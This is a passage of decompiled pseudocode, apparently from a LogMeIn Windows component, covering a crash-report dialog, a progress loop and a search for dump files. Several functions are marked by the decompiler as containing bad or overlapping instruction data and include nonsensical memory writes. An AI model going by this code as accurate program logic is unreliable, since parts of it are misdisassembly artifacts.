      (*DAT_10079420)(iVar6,0x402,0,0,uVar10,uVar11);
    }
    iVar6 = FUN_10058b59(0,0,FUN_1002a6a0,param_1,0,&local_8);
    *(int *)(param_1 + 0x28) = iVar6;
    return iVar6;
  }
  *puVar5 = *puVar5 | uVar8;
  *(char *)puVar5 = (char)*puVar5 + (char)uVar9;
  *(char *)puVar5 = (char)*puVar5 + (char)uVar9;
  if ((char)*puVar5 != '\0') {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_1002a6a0 */

undefined4 FUN_1002a6a0(int param_1)

{
  code *pcVar1;
  undefined4 uVar2;
  short sVar3;
  uint uVar4;
  
  pcVar1 = DAT_10079420;
  uVar4 = 0;
  sVar3 = 0;
  if ((param_1 != 0) && (DAT_10096608 == 0)) {
    do {
      (*DAT_10079310)(1);
      uVar4 = (uVar4 + 1) % 100;
      if (uVar4 == 0) {
        sVar3 = (short)(sVar3 + 1) % DAT_1009686c;
        uVar2 = FUN_1052ac87(*(undefined4 *)(param_1 + 0x14),0x450);
        (*pcVar1)(uVar2,0x402,(int)sVar3);
      }
    } while (DAT_10096608 == 0);
  }
  FUN_10058c33(0);
  return 0;
}



/* Function: FUN_1002a730 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * __thiscall
FUN_1002a730(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  undefined4 uVar4;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007608e;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  param_1[1] = param_4;
  param_1[3] = param_2;
  uVar1 = DAT_1009b5bc;
  _DAT_10096f44 = 2;
  *param_1 = &PTR_FUN_10087524;
  param_1[2] = 3;
  param_1[4] = 0x8d;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 1;
  param_1[8] = 0x84;
  param_1[9] = 0x83;
  DAT_10096608 = 0;
  DAT_1009ad20 = param_1;
  if ((uVar1 & 1) == 0) {
    DAT_1009b5bc = uVar1 | 1;
    local_8 = 0;
    FUN_10033a00(0,param_1);
  }
  iVar3 = DAT_1009b5c0;
  if (DAT_1009b5c0 == 0) {
    iVar3 = 1;
  }
  switch(iVar3) {
  case 2:
    param_1[8] = 0x90;
    param_1[9] = 0x8f;
    break;
  case 3:
    param_1[8] = 0x92;
    param_1[9] = 0x91;
    break;
  case 4:
    param_1[8] = 0x96;
    param_1[9] = 0x95;
    break;
  case 5:
    param_1[8] = 0x98;
    param_1[9] = 0x98;
    break;
  case 7:
    param_1[8] = 0x9e;
    param_1[9] = 0x9e;
    break;
  case 8:
    param_1[8] = 0x9b;
    param_1[9] = 0x9b;
    break;
  case 9:
    param_1[8] = 0x9f;
    param_1[9] = 0x9f;
    break;
  case 10:
    param_1[8] = 0xa2;
    param_1[9] = 0xa2;
  }
  if (param_1[6] == 0) {
    if (param_1[7] == 0) {
      FUN_10295474(*(undefined2 *)(param_1 + 4));
      ExceptionList = local_10;
      return param_1;
    }
    uVar4 = FUN_1018eabe(&stack0xfffffffc,param_1[3],*(undefined2 *)(param_1 + 4),0,FUN_1002a940,
                         param_1,uVar2);
    FUN_10458e17(uVar4,param_1[5],5);
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1002a900 */

undefined4 * __thiscall FUN_1002a900(undefined4 *param_1,byte param_2)

{
  *param_1 = &PTR_FUN_10087524;
  FUN_10463b68();
  DAT_10096608 = 1;
  DAT_1009ad20 = 0;
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_1002a940 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 __thiscall
FUN_1002a940(undefined4 param_1,undefined4 param_2,undefined4 param_3,uint param_4,int param_5)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = param_5;
  switch(param_3) {
  case 0x16:
    if ((param_4 != 0) || (param_5 != 1)) {
      FUN_10585fa2(param_2,0x111,2,0);
    }
    break;
  case 0x24:
    *(undefined4 *)(param_5 + 0x18) = 0x118;
    *(undefined4 *)(param_5 + 0x1c) = 0xf0;
    return 1;
  case 0x110:
    if (DAT_1009ad20 == (int *)0x0) {
      if (param_5 == 0) {
        return 0;
      }
      FUN_1002ab40(param_2,0);
    }
    else {
      FUN_1002ab40(param_2,DAT_1009ad20);
    }
    break;
  case 0x111:
    if ((short)param_4 == 1) {
      _DAT_10096f44 = 1;
    }
    else if ((short)param_4 != 2) break;
    FUN_106628d4(param_1,param_2,param_4 & 0xffff);
    DAT_10096608 = 1;
  }
  if (DAT_1009ad20 == (int *)0x0) {
    return 0;
  }
  param_5 = 0;
  uVar2 = (**(code **)(*DAT_1009ad20 + 4))(param_2,param_3,param_4,iVar1,&param_5,0);
  return uVar2;
}



/* Function: FUN_1002ab40 */

void __thiscall FUN_1002ab40(int param_1,undefined4 param_2)

{
  uint uVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 uVar3;
  undefined4 extraout_EDX_00;
  undefined8 uVar4;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100760be;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if (*(int *)(param_1 + 0x14) == 0) {
    *(undefined4 *)(param_1 + 0x14) = param_2;
    uVar4 = FUN_102b75cb(&stack0xfffffffc,*(undefined4 *)(param_1 + 0xc),
                         *(undefined4 *)(param_1 + 0x20),uVar1);
    uVar3 = (undefined4)((ulonglong)uVar4 >> 0x20);
    if ((int)uVar4 != 0) {
      (*DAT_10079420)(param_2,0x80,0,(int)uVar4);
      uVar3 = extraout_EDX;
    }
    iVar2 = FUN_10328b96(uVar3,*(undefined4 *)(param_1 + 0xc),*(undefined4 *)(param_1 + 0x24));
    if (iVar2 != 0) {
      (*DAT_10079420)(param_2,0x80,1,iVar2);
    }
    FUN_10151c7b(param_2,0xffffffeb,param_1);
    if ((DAT_1009b5b0 & 1) == 0) {
      DAT_1009b5b0 = DAT_1009b5b0 | 1;
      local_8 = 0;
      FUN_10028f80(0,0,0);
      FUN_10057b51(&LAB_10078840);
    }
    FUN_10029030(param_2,*(undefined4 *)(param_1 + 4),*(undefined4 *)(param_1 + 8));
    if (*(int *)(param_1 + 0x1c) == 0) {
      FUN_1030001f(extraout_EDX_00,*(undefined4 *)(param_1 + 0x14),5);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1002ac30 */

undefined4 * __fastcall FUN_1002ac30(undefined4 *param_1)

{
  param_1[0xf] = 3;
  param_1[10] = 0;
  param_1[0xb] = 3;
  param_1[0xe] = *(byte *)(param_1 + 0xf) & 1 | 6;
  param_1[0xc] = 0;
  param_1[0xd] = 3;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  return param_1;
}



/* Function: FUN_1002acb0 */

ushort * __fastcall FUN_1002acb0(undefined4 param_1,undefined4 param_2,uint param_3)

{
  ushort *puVar1;
  int iVar2;
  ushort *puVar3;
  
  iVar2 = FUN_1039b1a3();
  if (iVar2 == 0) {
    return (ushort *)0x0;
  }
  puVar3 = (ushort *)FUN_1038fbb9(param_1,iVar2);
  if (puVar3 != (ushort *)0x0) {
    iVar2 = FUN_1009d37c(puVar3,param_1,param_2);
    puVar1 = (ushort *)((int)puVar3 + iVar2);
    for (param_3 = param_3 & 0xf; param_3 != 0; param_3 = param_3 - 1) {
      if (puVar1 <= puVar3) {
        return (ushort *)0x0;
      }
      puVar3 = puVar3 + *puVar3 + 1;
    }
    if (puVar3 < puVar1) {
      if (*puVar3 == 0) {
        puVar3 = (ushort *)0x0;
      }
      return puVar3;
    }
  }
  return (ushort *)0x0;
}



/* Function: FUN_1002ad20 */

/* WARNING: Instruction at (ram,0x1002ad5b) overlaps instruction at (ram,0x1002ad57)
    */

int __fastcall FUN_1002ad20(uint param_1)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  uint in_stack_ff1374bc;
  
  iVar1 = FUN_10057835(0);
  iVar4 = 1;
  if (iVar1 != 0) {
    do {
      while( true ) {
        uVar2 = FUN_100e650c(iVar1,6,(param_1 >> 4) + 1 & 0xffff,0);
        if (uVar2 == in_stack_ff1374bc) break;
        iVar4 = iVar4 * 2 + (uint)(uVar2 < in_stack_ff1374bc);
      }
      iVar3 = FUN_1002acb0();
      if (iVar3 != 0) {
        return iVar1;
      }
      iVar1 = FUN_10057835(iVar4);
      iVar4 = iVar4 + 1;
    } while (iVar1 != 0);
  }
  return 0;
}



/* Function: FUN_1002ada0 */

/* WARNING: Instruction at (ram,0x1002ad5b) overlaps instruction at (ram,0x1002ad57)
    */

int * FUN_1002ada0(int *param_1,int param_2)

{
  code *pcVar1;
  uint uVar2;
  int in_EAX;
  int iVar3;
  uint *puVar4;
  int *piVar5;
  short unaff_BX;
  int unaff_EDI;
  undefined1 uVar6;
  undefined8 uVar7;
  uint in_stack_ff1374bc;
  
  if (param_1 != (int *)0x0) {
    uVar6 = param_2 == 0;
    in_EAX = param_2;
    if (!(bool)uVar6) {
      *param_1 = param_2;
      iVar3 = FUN_10124d68(param_1);
      param_1[1] = iVar3;
      uVar7 = FUN_101d8651(&DAT_1009b214);
      iVar3 = (int)uVar7;
      if (!(bool)uVar6) {
        puVar4 = (uint *)CONCAT31((int3)((ulonglong)uVar7 >> 8),(char)uVar7 + 'N');
        *puVar4 = *puVar4 | (uint)((ulonglong)uVar7 >> 0x20);
        param_1[2] = (int)puVar4;
        DAT_1009b22c = param_1;
        piVar5 = (int *)(*DAT_100792fc)(&DAT_1009b214);
        return piVar5;
      }
      while( true ) {
        if (iVar3 != 0) {
          return param_1;
        }
        param_1 = (int *)FUN_10057835(unaff_EDI);
        unaff_EDI = unaff_EDI + 1;
        if (param_1 == (int *)0x0) break;
        while( true ) {
          uVar2 = FUN_100e650c(param_1,6,unaff_BX + 1,0);
          if (uVar2 == in_stack_ff1374bc) break;
          unaff_EDI = unaff_EDI * 2 + (uint)(uVar2 < in_stack_ff1374bc);
        }
        iVar3 = FUN_1002acb0();
      }
      return (int *)0x0;
    }
  }
  FUN_1058d461(in_EAX,0xc0000005,1,0,0);
  pcVar1 = (code *)swi(3);
  piVar5 = (int *)(*pcVar1)();
  return piVar5;
}



/* Function: FUN_1002ae00 */

/* WARNING: Unable to track spacebase fully for stack */

undefined4 FUN_1002ae00(void)

{
  int *piVar1;
  ulonglong uVar2;
  code *pcVar3;
  undefined4 *extraout_ECX;
  undefined4 *puVar4;
  uint *unaff_EBX;
  undefined4 *unaff_EBP;
  undefined4 *puVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  
  uVar6 = 0;
  uVar7 = 0;
  FUN_1029bc08(0,&DAT_1009b214);
  puVar5 = DAT_1009b22c;
  if (DAT_1009b22c != (undefined4 *)0x0) {
    uVar2 = FUN_1011f5e1(uVar7);
    puVar4 = extraout_ECX;
    while (puVar5[1] != (int)(uVar2 / *unaff_EBX)) {
      piVar1 = puVar5 + 2;
      puVar4 = puVar5;
      puVar5 = (undefined4 *)*piVar1;
      if ((undefined4 *)*piVar1 == (undefined4 *)0x0) {
        *unaff_EBP = &DAT_1009b214;
        pcVar3 = DAT_100792fc;
        unaff_EBP[-1] = 0x1002ae3a;
        (*pcVar3)();
        return 0;
      }
    }
    if (puVar4 == (undefined4 *)0x0) {
      uVar6 = *puVar5;
      DAT_1009b22c = (undefined4 *)puVar5[2];
      *unaff_EBP = &DAT_1009b214;
      pcVar3 = DAT_100792fc;
      unaff_EBP[-1] = 0x1002ae58;
      (*pcVar3)();
      return uVar6;
    }
    puVar4[2] = puVar5[2];
    uVar6 = *puVar5;
  }
  (*DAT_100792fc)(&DAT_1009b214);
  return uVar6;
}



/* Function: FUN_1002ae80 */

uint __fastcall FUN_1002ae80(undefined4 param_1,int param_2)

{
  ushort uVar1;
  uint local_8;
  
  if (param_2 != 0) {
    uVar1 = FUN_1066cb03();
    local_8 = (uint)uVar1;
    if (uVar1 != 0) {
      FUN_1002ba50(&local_8);
    }
    return local_8 & 0xffff;
  }
  return 0;
}



/* Function: FUN_1002aec0 */

undefined4 __thiscall FUN_1002aec0(undefined4 param_1,byte param_2)

{
  FUN_1002aef0();
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_1002aef0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __fastcall FUN_1002aef0(undefined4 *param_1)

{
  uint uVar1;
  char *pcVar2;
  undefined4 *extraout_ECX;
  undefined4 *puVar3;
  char *extraout_ECX_00;
  char cVar4;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  puStack_c = &LAB_1007611e;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = CSendReportDlg2::vftable;
  local_8 = 0;
  if (param_1[0xb] != 0) {
    puVar3 = param_1;
    if ((DAT_1009b5d4 & 1) == 0) {
      DAT_1009b5d4 = DAT_1009b5d4 | 1;
      _DAT_1009b5d8 = DAT_1009abd0;
      if (DAT_1009abd0 != (int *)0x0) {
        LOCK();
        *DAT_1009abd0 = *DAT_1009abd0 + 1;
        UNLOCK();
      }
      _DAT_1009b5dc = DAT_1009abd4;
      if (DAT_1009abd4 != (int *)0x0) {
        LOCK();
        *DAT_1009abd4 = *DAT_1009abd4 + 1;
        UNLOCK();
      }
      local_8._0_1_ = 3;
      local_8._1_3_ = 0;
      if ((DAT_10099158 & 1) == 0) {
        DAT_10099158 = DAT_10099158 | 1;
        FUN_100064d0(uVar1);
        FUN_10057b51(&LAB_10078190);
      }
      _DAT_1009b5e0 = &DAT_100990d8;
      _DAT_1009b5e4 = 0;
      _DAT_1009b5e8 = 0;
      _DAT_1009b5e4 = FUN_10017840();
      local_8._0_1_ = 4;
      DAT_1009b5ec = 0;
      _DAT_1009b5f0 = 0;
      DAT_1009b5ec = FUN_10017840();
      _DAT_1009b5f4 = _DAT_1008c410;
      DAT_1009b5f8 = _UNK_1008c414;
      DAT_1009b5fc = _UNK_1008c418;
      DAT_1009b600 = _UNK_1008c41c;
      FUN_10057b51(&LAB_10078890);
      local_8 = (uint)local_8._1_3_ << 8;
      puVar3 = extraout_ECX;
    }
    cVar4 = '\0';
    if (param_1[0xb] != 0) {
      cVar4 = (DAT_1009660c != 1) + '\x01';
    }
    FUN_1003a2d0(puVar3,cVar4);
  }
  cVar4 = '\0';
  if ((int *)param_1[0xc] != (int *)0x0) {
    (**(code **)(*(int *)param_1[0xc] + 4))(1);
  }
  *param_1 = CMultiLingualDlgImpl<class_CSendReportDlg2>::vftable;
  pcVar2 = (char *)FUN_105f7cff(param_1[5]);
  *extraout_ECX_00 = *extraout_ECX_00 + (char)pcVar2 + cVar4;
  *pcVar2 = *pcVar2 + (char)pcVar2;
  pcVar2 = pcVar2 + 0x1009ad24;
  *pcVar2 = *pcVar2 + (char)pcVar2;
  *pcVar2 = *pcVar2 + (char)pcVar2;
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1002b070 */

void __fastcall FUN_1002b070(int param_1)

{
  undefined4 uVar1;
  int iVar2;
  char extraout_CH;
  int iVar3;
  char *extraout_EDX;
  int iVar4;
  undefined4 in_stack_ffffffc0;
  undefined4 uVar5;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076153;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  uVar1 = FUN_1038155c(param_1,*(undefined4 *)(param_1 + 0x14),0x44d,
                       DAT_100956e0 ^ (uint)&stack0xfffffffc);
  uVar5 = 0x1002b0b4;
  uVar1 = (*DAT_10079420)(uVar1,0xf0,0,0);
  iVar3 = 0;
  *(undefined4 *)(param_1 + 0x2c) = uVar1;
  if (0 < *(int *)(param_1 + 8)) {
    iVar4 = 0;
    do {
      iVar2 = *(int *)(*(int *)(param_1 + 4) + 4 + iVar4);
      if (iVar2 == 1) {
        iVar2 = (uint)(*(int *)(param_1 + 0x2c) != 0) * 4 + 5;
LAB_1002b0f1:
        *(int *)(*(int *)(param_1 + 4) + 8 + iVar4) = iVar2;
      }
      else if (iVar2 == 2) {
        iVar2 = (uint)(*(int *)(param_1 + 0x2c) == 0) * 8 + 8;
        goto LAB_1002b0f1;
      }
      iVar3 = iVar3 + 1;
      iVar4 = iVar4 + 0xc;
    } while (iVar3 < *(int *)(param_1 + 8));
  }
  if ((DAT_1009b5b0 & 1) == 0) {
    DAT_1009b5b0 = DAT_1009b5b0 | 1;
    DAT_1009b5b4 = 0;
    DAT_1009b5b8 = 0;
    local_8 = 1;
    uVar1 = 0;
    FUN_10041860(0,0,0,in_stack_ffffffc0,uVar5);
    FUN_10041d80(&DAT_100874a0,&DAT_10083854,uVar1,in_stack_ffffffc0,uVar5);
    FUN_10041d80(&DAT_100874ac,&DAT_100874a8,uVar1,in_stack_ffffffc0,uVar5);
    FUN_10041d80(L"\n\n$e",&PTR_10083554,uVar1,in_stack_ffffffc0,uVar5);
    FUN_10041d80(L"%PRODUCTNAME",L"DealWithLanguage",uVar1,in_stack_ffffffc0,uVar5);
    FUN_10057b51(&LAB_10078840);
  }
  FUN_10029030(*(undefined4 *)(param_1 + 0x14),*(undefined4 *)(param_1 + 4),
               *(undefined4 *)(param_1 + 8));
  FUN_10261b83(*(undefined4 *)(param_1 + 0x14),0x455,&PTR_10083554);
  *extraout_EDX = *extraout_EDX + extraout_CH;
  uVar1 = FUN_1016b1a4(&stack0xfffffffc,*(undefined4 *)(param_1 + 0x14),0x455);
  FUN_102151d8(uVar1);
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1002b1f0 */

/* WARNING: Instruction at (ram,0x1002b439) overlaps instruction at (ram,0x1002b437)
    */
/* WARNING: Unable to track spacebase fully for stack */
/* WARNING: Removing unreachable block (ram,0x1002b2fb) */
/* WARNING: Removing unreachable block (ram,0x1002b30b) */
/* WARNING: Removing unreachable block (ram,0x1002b306) */
/* WARNING: Removing unreachable block (ram,0x1002b30d) */

uint __thiscall
FUN_1002b1f0(undefined4 param_1,undefined4 param_2,undefined4 param_3,uint param_4,code *param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  byte extraout_CL;
  char extraout_CH;
  undefined4 extraout_ECX;
  char *pcVar6;
  undefined4 *puVar7;
  undefined1 *puVar8;
  int iVar9;
  undefined8 uVar10;
  int local_64;
  int local_60;
  void *local_14;
  undefined1 *puStack_10;
  int local_c;
  
  local_c = 0xffffffff;
  puStack_10 = &LAB_10076188;
  local_14 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xffffff88;
  switch(param_3) {
  case 0x110:
    if (param_5 != (code *)0x0) {
      if (*(int *)(param_5 + 0x14) != 0) {
        return 1;
      }
      ExceptionList = &local_14;
      FUN_1002b560(param_2,param_1);
      iVar9 = FUN_10403bae(*(undefined4 *)(param_5 + 0x14),0x44d,uVar3);
      pbVar1 = (byte *)(param_4 + 0x8bc68bd8);
      bVar2 = (byte)extraout_ECX & 7;
      *pbVar1 = *pbVar1 >> bVar2 | *pbVar1 << 8 - bVar2;
      *(undefined4 *)(iVar9 + 0x27) = extraout_ECX;
      *(undefined4 *)(iVar9 + 0x2b) = 0;
      uVar10 = FUN_1034ab45();
      pcVar6 = (char *)((ulonglong)uVar10 >> 0x20);
      puVar5 = (undefined4 *)uVar10;
      *(uint *)(param_4 + 0x358b2c7e) = *(uint *)(param_4 + 0x358b2c7e) | 0x20;
      *pcVar6 = *pcVar6 + extraout_CH;
      *puVar5 = 1;
      puVar5[-1] = 0xf1;
      puVar5[-2] = param_4;
      puVar7 = puVar5 + -3;
      puVar5[-3] = 0x1002b3d8;
      (*param_5)();
      *(undefined4 *)((int)puVar7 + -4) = 0x1002b3e0;
      FUN_1002b070();
      *(undefined4 *)((int)puVar7 + -4) = 0;
      *(undefined4 *)((int)puVar7 + -8) = param_2;
      *(undefined4 *)((int)puVar7 + -0xc) = 0xf1;
      *(uint *)((int)puVar7 + -0x10) = param_4;
      *(undefined4 *)(param_5 + 0x2c) = param_2;
      puVar8 = (undefined1 *)((int)puVar7 + -0x14);
      *(undefined4 *)((int)puVar7 + -0x14) = 0x1002b3f1;
      (*param_5)();
      *(undefined4 *)(puVar8 + -4) = 0x1002b3f9;
      FUN_1002b070();
      ExceptionList = *(void **)(puVar8 + 0x68);
      return 1;
    }
    goto LAB_1002b437;
  case 0x111:
    uVar3 = param_4 & 0xffff;
    if (uVar3 < 0x44e) {
      if (uVar3 == 0x44d) {
        ExceptionList = &local_14;
        FUN_1002b070();
        ExceptionList = local_14;
        return 1;
      }
    }
    else if (uVar3 == 0x456) {
      ExceptionList = &local_14;
      FUN_1001f080(param_1,L"\\LogMeIn",L"\\Dumps",1);
      local_c = 0;
      uVar3 = 0;
      if (local_60 - local_64 >> 2 != 0) {
        do {
          iVar9 = *(int *)(local_64 + uVar3 * 4);
          if (iVar9 == 0) {
            iVar9 = 0;
          }
          else {
            iVar9 = iVar9 + 0xc;
          }
          uVar4 = FUN_1000fa00(0,0);
          local_c._0_1_ = 1;
          FUN_10020000(L"*.xml",iVar9);
          local_c = (uint)local_c._1_3_ << 8;
          FUN_1000ba10();
          thunk_FUN_100579ee(uVar4);
          uVar3 = uVar3 + 1;
        } while (uVar3 < (uint)(local_60 - local_64 >> 2));
      }
      FUN_1000ab80();
      ExceptionList = local_14;
      return 1;
    }
    break;
  case 0x201:
  case 0x202:
    if ((param_4 & 4) != 0) {
      ExceptionList = &local_14;
      *(undefined4 *)(DAT_1009ad24 + 0x34) = 1;
      uVar3 = FUN_1035782d(param_2,0x111,2,0,uVar3);
      *(byte *)(param_4 + 0x558b1475) = *(byte *)(param_4 + 0x558b1475) & extraout_CL;
      return uVar3 | 0x8b;
    }
  }
LAB_1002b437:
  ExceptionList = &local_14;
  uVar3 = FUN_1002bf50(param_4,param_5);
  ExceptionList = local_14;
  return uVar3;
}



/* Function: FUN_1002b560 */

/* WARNING: Control flow encountered bad instruction data */

void __thiscall FUN_1002b560(int param_1,undefined4 param_2)

{
  int iVar1;
  undefined2 uVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  int iVar6;
  int *piVar7;
  undefined4 extraout_ECX;
  int *piVar8;
  code *unaff_EDI;
  int local_38;
  int local_34;
  int *local_30;
  int *local_2c;
  int local_28;
  int local_24;
  int iStack_20;
  int iStack_1c;
  int iStack_18;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100761c6;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *(undefined4 *)(param_1 + 0x34) = 0;
  local_28 = param_1;
  local_14 = uVar3;
  FUN_1002c160(param_2,param_1);
  FUN_101b65f0(uVar3);
  uVar4 = (*unaff_EDI)(*(undefined4 *)(param_1 + 0x14),0x457);
  uVar5 = FUN_1066503c(local_28,*(undefined4 *)(local_28 + 0xc),*(undefined4 *)(local_28 + 0x24));
  (*DAT_10079420)(uVar4,0x170,uVar5,0);
  local_2c = (int *)0x0;
  local_8 = 0;
  FUN_1002b7f0(param_2,0x455,&local_2c);
  iVar1 = local_28;
  iVar6 = (*unaff_EDI)(*(undefined4 *)(local_28 + 0x14),0x455);
  local_24 = 0;
  iStack_20 = 0;
  iStack_1c = 0;
  iStack_18 = 0;
  if (iVar6 != 0) {
    FUN_10226855(iVar6,iVar6,&local_24);
  }
  local_38 = 0;
  local_34 = 0;
  FUN_1040ca16(uVar4,*(undefined4 *)(iVar1 + 0x14),&local_38);
  iVar6 = FUN_10483133(&local_24,-local_38,-local_34);
  *(byte *)(iVar6 + 0x4c6a1009) = *(byte *)(iVar6 + 0x4c6a1009) & (byte)iVar6;
  iVar6 = FUN_10058463();
  if (iVar6 == 0) {
    local_28 = 0;
  }
  else {
    local_28 = FUN_10029de0(*(undefined4 *)(iVar1 + 0x14));
  }
  piVar8 = local_2c;
  *(int *)(iVar1 + 0x30) = local_28;
  if (local_28 != 0) {
    uVar4 = *(undefined4 *)(iVar1 + 0x14);
    iVar6 = local_28 + 0x20;
    uVar2 = FUN_1002bde0(iVar6);
    FUN_1002bd10(uVar4,&local_24,0,0x50030000,0,0,uVar2,iVar6);
    if ((piVar8 != (int *)0x0) && (piVar8[2] != 0)) {
      piVar7 = (int *)FUN_1000ae10(&local_30);
      if (*piVar7 == 0) {
        iVar6 = 0;
      }
      else {
        iVar6 = *piVar7 + 0xc;
      }
      FUN_10006250("SetHyperLinkText(\'%s\')\n",iVar6);
      if (local_30 != (int *)0x0) {
        LOCK();
        iVar6 = *local_30;
        *local_30 = iVar6 + -1;
        UNLOCK();
        if (iVar6 + -1 < 0) {
          FUN_100579ee(local_30);
        }
      }
      FUN_1031e982(&stack0xfffffffc,*(undefined4 *)(iVar1 + 0x14),0x455,&PTR_10083554);
      uVar4 = extraout_ECX;
      FUN_1002bae0(piVar8 + 3);
      FUN_10029f60(uVar4);
    }
    FUN_1055820d(*(undefined4 *)(*(int *)(iVar1 + 0x30) + 4),local_24,iStack_20,iStack_1c - local_24
                 ,iStack_18 - iStack_20,1);
    piVar8 = (int *)((int)piVar8 + 1);
  }
  if ((DAT_1009b5b0 & 1) == 0) {
    DAT_1009b5b0 = DAT_1009b5b0 | 1;
    local_8 = CONCAT31(local_8._1_3_,1);
    FUN_10028f80(0,&DAT_10087588,0x8a);
    FUN_10057b51(&LAB_10078840);
  }
  FUN_1002b990(*(undefined4 *)(iVar1 + 0x14));
  if (*(int *)(iVar1 + 0x1c) != 0) {
    if ((DAT_1009acc4 & 1) == 0) {
      DAT_1009acc4 = DAT_1009acc4 | 1;
      DAT_1009acc0 = 3;
    }
    *(uint *)(iVar1 + 0x38) = (uint)(DAT_1009acc0 == 3);
    if (piVar8 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar8;
      *piVar8 = *piVar8 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar8);
      }
    }
    ExceptionList = local_10;
    FUN_100579df();
    return;
  }
  FUN_10433748(*(undefined4 *)(iVar1 + 0x14),5);
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: FUN_1002b7f0 */

void FUN_1002b7f0(undefined4 param_1,undefined4 param_2,int *param_3)

{
  short sVar1;
  undefined4 *puVar2;
  int iVar3;
  short *psVar4;
  int *piVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint local_8;
  
  piVar5 = (int *)*param_3;
  if (piVar5 != (int *)0x0) {
    if (*piVar5 == 0) {
      piVar5[2] = 0;
      *(undefined2 *)(piVar5 + 3) = 0;
      goto LAB_1002b82a;
    }
    LOCK();
    iVar3 = *piVar5;
    *piVar5 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  piVar5 = (int *)0x0;
LAB_1002b82a:
  *param_3 = (int)piVar5;
  uVar7 = 0x80;
  local_8 = 0;
  do {
    piVar5 = (int *)*param_3;
    uVar7 = uVar7 * 2;
    uVar8 = uVar7 + 1;
    if ((piVar5 == (int *)0x0) || (*piVar5 == 0)) {
      puVar2 = (undefined4 *)FUN_10010290(uVar8);
    }
    else {
      if (uVar8 < piVar5[2] + 1U) {
        uVar8 = piVar5[2] + 1U;
      }
      if (uVar8 < 0x10000) {
        uVar6 = 0x10;
        if (0x10 < uVar8) {
          uVar6 = uVar8;
        }
        uVar8 = uVar6 + 0xf & 0xfffffff0;
      }
      else {
        uVar8 = uVar8 + 0xffff & 0xffff0000;
      }
      puVar2 = (undefined4 *)FUN_100581b4(uVar8 * 2 + 0xe);
      if (puVar2 != (undefined4 *)0x0) {
        puVar2[1] = uVar8;
        *puVar2 = 0;
        puVar2[2] = piVar5[2];
        FUN_1005d740(puVar2 + 3,piVar5 + 3,piVar5[2] * 2 + 2);
        LOCK();
        iVar3 = *piVar5;
        *piVar5 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar5);
        }
      }
    }
    *param_3 = (int)puVar2;
    if ((puVar2 == (undefined4 *)0x0) && (piVar5 != (int *)0x0)) {
      LOCK();
      iVar3 = *piVar5;
      *piVar5 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar5);
      }
    }
    if ((*param_3 != 0) && (iVar3 = *param_3 + 0xc, iVar3 != 0)) {
      local_8 = FUN_10523e26(param_1,param_2,iVar3,uVar7);
    }
    iVar3 = *param_3;
    if (iVar3 != 0) {
      if (local_8 == 0xffffffff) {
        psVar4 = (short *)(iVar3 + 0xc);
        if (psVar4 == (short *)0x0) {
          uVar8 = 0;
        }
        else {
          do {
            sVar1 = *psVar4;
            psVar4 = psVar4 + 1;
          } while (sVar1 != 0);
          uVar8 = (int)psVar4 - (iVar3 + 0xe) >> 1;
        }
      }
      else {
        uVar6 = *(int *)(iVar3 + 4) - 1;
        uVar8 = local_8;
        if (uVar6 <= local_8) {
          uVar8 = uVar6;
        }
      }
      *(uint *)(iVar3 + 8) = uVar8;
